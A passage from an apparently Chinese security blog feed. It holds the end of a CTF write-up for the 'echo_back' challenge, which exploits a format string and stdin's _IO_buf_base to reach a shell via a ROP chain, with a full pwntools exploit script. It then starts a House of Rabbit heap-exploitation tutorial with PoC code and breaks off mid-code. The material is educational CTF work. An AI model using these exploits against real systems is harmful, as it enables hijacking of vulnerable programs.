title="漏洞分析"></a>漏洞分析</h2><p>总体来说题目逻辑简单，漏洞也比较明显——格式化字符串，但是格式化字符串的长度是有限制的：</p><p><img src="/img/ciscn/3-1.png" alt="漏洞"></p><p>首先利用格式化字符串可以泄露PIE、栈、libc地址。存在一个setname函数，可以由用户输入一个长度为7的值，由此步骤和格式化字符串漏洞，可以达到一个向任意地址写一个四字节或两字节或单字节的\x00。</p><p><img src="/img/ciscn/3-2.png" alt="漏洞"></p><p>向任意地址写单字节的\x00还是比较敏感的，在去年的WHCTF 2017 中出现过一道向_IO_buf_base末位写\x00的利用方法，但是给定的libc是libc-2.24.so，此题虽然给的是libc-2.23.so，同样利用这个方法。</p><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该种利用方法利用的是文件IO中的几个指针在scanf中的应用。之前针对IO的利用也写过一些，比如House of Orange，那种利用方法比较复杂，是与堆结合，之前写过一篇丢到了看雪上：<a href="https://bbs.pediy.com/thread-223334.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223334.htm</a> 这个攻击方法没有那么复杂，但是需要读scanf的源码。</p><p>首先scanf调用了 _IO_vfscanf ，并且提供增加了操作的文件指针stdin，这个指针很熟悉，是0号文件。其结构体是：</p><p><img src="/img/ciscn/3-4.png" alt="scanf"></p><p><img src="/img/ciscn/3-3.png" alt="IO指针"></p><p>其中红圈内的指针是本次漏洞利用主角</p><p>继续追踪_IO_vfscanf 函数，其具体实现是内联函数_IO_vfscanf_internal，其内部实现了scanf对于格式化的操作，其中比较重要的是inchar()，这个函数是读入用户输入数据的函数。此函数最终调用了_IO_new_file_underflow进行输入，这个最底层的操作。</p><p>查看函数逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p>当_IO_read_ptr &lt; _IO_read_end时，函数直接返回_IO_read_ptr。反之，则会进行一系列赋值操作，最终调用read的系统调用向_IO_buf_base中读入数据。可以想到，当可以控制_IO_buf_base的值就可以达到任意地址写的目的了。</p><p>题目中可以利用是因为当覆盖为00时，指针恰好指向了stdin内部地址，并且可以再次覆写_IO_buf_base进一步造成内存任意写，而在scanf后面跟了一个getchar()函数，每次调用这个函数是会导致_IO_read_ptr++。</p><p><img src="/img/ciscn/3-8.png" alt="echo函数"></p><p>由于在覆写_IO_base_buf时，会造成_IO_read_end+=输入的size，不断利用getchar可以使得_IO_read_ptr逐渐增大到_IO_read_end，最终再次调用read系统调用，达到内存任意写的目的。第二次覆写_IO_buf_base的内容为函数返回地址，写入ROP即可拿到shell</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./echo_back'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p = process(<span class="string">'./echo_back'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'117.78.43.123'</span>, <span class="number">32619</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#off = 0x001b0000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name'</span>)</span><br><span class="line">p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span><span class="params">(content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line">echo(<span class="string">'%12$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">stack_addr = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] stack :'</span>,hex(stack_addr)</span><br><span class="line">echo(<span class="string">'%13$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">pie = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0xd08</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] pie :'</span>,hex(pie)</span><br><span class="line">echo(<span class="string">'%19$p\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'anonymous say:'</span>)</span><br><span class="line">libc.address = int(p.recvline()[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-240</span>-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">set_name(p64(libc.address + <span class="number">0x3c4918</span>)[:<span class="number">-1</span>])</span><br><span class="line">echo(<span class="string">'%16$hhn'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">padding = p64(libc.address+<span class="number">0x3c4963</span>)*<span class="number">3</span> + p64(stack_addr<span class="number">-0x28</span>)+p64(stack_addr+<span class="number">0x10</span>)</span><br><span class="line">p.send(padding)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(padding)<span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">rop = p64(pie+<span class="number">0x0000000000000d93</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000000d8c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d90 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d92 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000940 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d93 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d91 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000d8d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000861 : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤... 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。最后做出来和复现的有三道：note-service2  、 house_of_grey 、 echo_back
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>House Of Rabbit 原理</title>
    <link href="http://p4nda.top/2018/04/18/house-of-rabbit/"/>
    <id>http://p4nda.top/2018/04/18/house-of-rabbit/</id>
    <published>2018-04-18T12:49:22.000Z</published>
    <updated>2018-07-05T13:32:46.699Z</updated>
    
    <content type="html"><![CDATA[<p>House Of Rabbit是一个比较新的堆利用姿势，在满足条件的情况下，可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的目的。</p><h1 id="所需条件"><a href="#所需条件" class="headerlink" title="所需条件"></a>所需条件</h1><ol><li>可以分配任意大小的堆块并且释放，主要包括三类fastbin大小的堆块、smallbin大小的堆块、较大的堆块（用于分配到任意地址处）</li><li>存在一块已知地址的内存空间，并可以任意写至少<strong>0x20</strong>长度的字节</li><li>存在fastbin dup、UAF等漏洞，用于劫持fastbin的fd指针。</li></ol><p>当存在上述三个条件时，即可使用House Of Rabbit攻击方法，Rabbit的含义大概是可以JUMP到任意地址（日本人的冷幽默？？）</p><h1 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h1><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>在<a href="https://github.com/shift-crops/House_of_Rabbit/blob/master/house_of_rabbit.c" target="_blank" rel="noopener">此处</a>有可以使用的样例文件，来自 <a href="https://github.com/shift-crops" target="_blank" rel="noopener">shift-crops</a> ，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   PoC of House of Rabbit</span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 16.04 (64bit).</span></span><br><span class="line"><span class="comment">   </span></span><br><span class="line"><span class="comment">   Yutaro Shimizu</span></span><br><span class="line"><span class="comment">   @shift_crops</span></span><br><span class="line"><span class="comment">   2017/09/14</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> target[<span class="number">0x10</span>] = <span class="string">"Hello, World!"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> gbuf[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p, *fast, *small, *fake;</span><br><span class="line"><span class="keyword">char</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"This is PoC of House of Rabbit\n"</span></span><br><span class="line"><span class="string">"This technique bypassing Heap ASLR without leaking address, "</span></span><br><span class="line"><span class="string">"and make it possible to overwrite a variable located at an arbitary address.\n"</span></span><br><span class="line"><span class="string">"Jump like a rabbit and get an accurate address by malloc! :)\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte in heap at %p, and free.\n"</span>, p);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Then, the value of 'av-&gt;system_mem' became larger than 0xa00000.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Free fast chunk and link to fastbins</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Free fast chunk and link to fastbins\n"</span>);</span><br><span class="line">fast = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// any size in fastbins is ok </span></span><br><span class="line">small = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate fast chunk and small chunk.\n"</span></span><br><span class="line"><span class="string">"  fast = %p\n"</span></span><br><span class="line"><span class="string">"  small = %p\n"</span>, fast, small);</span><br><span class="line"><span class="built_in">free</span>(fast);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Free fast chunk.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Make fake_chunk on .bss</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Make fake_chunk on .bss\n"</span>);</span><br><span class="line">gbuf[<span class="number">1</span>] = <span class="number">0x11</span>;</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fake_chunk1 (size : 0x%lx) is at %p\n"</span></span><br><span class="line"><span class="string">"  fake_chunk2 (size : 0x%lx) is at %p\n\n"</span></span><br><span class="line">, gbuf[<span class="number">3</span>], &amp;gbuf[<span class="number">2</span>], gbuf[<span class="number">1</span>], &amp;gbuf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// VULNERABILITY</span></span><br><span class="line"><span class="comment">// use after free or fastbins dup etc...</span></span><br><span class="line">fake = &amp;gbuf[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VULNERABILITY (e.g. UAF)\n"</span></span><br><span class="line"><span class="string">"  *fast = %p\n"</span></span><br><span class="line">, fake);</span><br><span class="line">*(<span class="keyword">unsigned</span> <span class="keyword">long</span>**)fast = fake;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  fastbins list : [%p, %p, %p]\n\n"</span>, fast<span class="number">-0x10</span>, fake, *(<span class="keyword">void</span> **)(fake+<span class="number">0x10</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. call malloc_consolidate</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"4. call malloc_consolidate\n"</span></span><br><span class="line"><span class="string">"  Free the small chunk (%p) next to top, and link fake_chunk1(%p) to unsorted bins.\n\n"</span></span><br><span class="line">, small, fake);</span><br><span class="line"><span class="built_in">free</span>(small);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. Link unsorted bins to appropriate list</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"5. Link unsorted bins to appropriate list\n"</span></span><br><span class="line"><span class="string">"  Rewrite fake_chunk1's size to 0xa0001 to bypass 'size &lt; av-&gt;system_mem' check.\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xa00001</span>;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate huge chunk.\n"</span></span><br><span class="line"><span class="string">"  Now, fake_chunk1 link to largebin[126](max).\n"</span></span><br><span class="line"><span class="string">"  Then, write fake_chunk1's size back to 0xfffffffffffffff1.\n\n"</span>);</span><br><span class="line">gbuf[<span class="number">3</span>] = <span class="number">0xfffffffffffffff1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. Overwrite targer variable</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"6. Overwrite targer variable on .data\n"</span></span><br><span class="line"><span class="string">"  target is at %p\n"</span></span><br><span class="line"><span class="string">"  Before : %s\n"</span></span><br><span class="line">, &amp;target, target);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>((<span class="keyword">void</span>*)&amp;target-(<span class="keyword">void</span>*)(gbuf+<span class="number">2</span>)<span class="number">-0x20</span>);</span><br><span class="line">victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0x10 byte at %p, and overwrite.\n"</span>, victim);</span><br><span class="line"><span class="built_in">strcpy</span>(victim, <span class="string">"Hacked!!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  After  : %s\n"</span>, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面对这个利用方法进行分步解析</p><h2 id="步骤1-增大malloc函数中-mmap分配阈值"><a href="#步骤1-增大malloc函数中-mmap分配阈值" class="headerlink" title="步骤1 增大malloc函数中 mmap分配阈值"></a>步骤1 增大malloc函数中 mmap分配阈值</h2><p>当通过malloc函数分配内存时，当超过某特定阈值时，堆块会由mmap来分配，但同时会改变该阈值。具体改变和分配代码如下：</p><p>分配代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) </span><br><span class="line">   &amp;&amp;(mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br><span class="line">   &#123;</span><br><span class="line">      ……</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>阈值改变：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsigned long sum;</span><br><span class="line">sum = atomic_exchange_and_add (&amp;mp_.mmapped_mem, size) + size;</span><br><span class="line">atomic_max (&amp;mp_.max_mmapped_mem, sum);</span><br></pre></td></tr></table></figure><p>因此在第一阶段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. Make 'av-&gt;system_mem &gt; 0xa00000'</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Make 'av-&gt;system_mem &gt; 0xa00000'\n"</span>);</span><br><span class="line">p = <span class="built_in">malloc</span>(<span class="number">0xa00000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"  Allocate 0xa00000 byte by mmap at %p, and free.\n"</span>, 